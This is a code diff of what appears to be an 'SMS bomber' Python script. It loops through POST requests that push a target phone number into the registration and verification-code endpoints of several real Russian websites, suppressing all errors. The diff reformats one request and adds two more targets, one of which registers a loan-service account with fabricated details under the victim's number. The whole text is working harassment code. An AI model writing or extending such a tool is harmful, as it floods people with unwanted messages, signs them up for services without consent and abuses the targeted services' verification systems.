@@ -63,7 +63,7 @@ def main():
       except:
         pass
       try:
-        requests.post("https://www.citilink.ru/registration/confirm/phone/+"+_phone+"/")
+        requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
       except:
         pass
       try:
@@ -340,6 +340,14 @@ def main():
         pass
       try:
         requests.post("https://ggbet.ru/api/auth/register-with-phone", data={"phone": "+" + _phone, "login": email, "password": password, "agreement": "on", "oferta": "on"})
+      except:
+        pass
+      try:
+        requests.post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": name, "firstName": name, "middleName": name, "mobilePhone": _phone, "email": email,"smsCode": ""})
+      except:
+        pass
+      try:
+        requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": _phone})
       except:
         pass
       iteration += 1
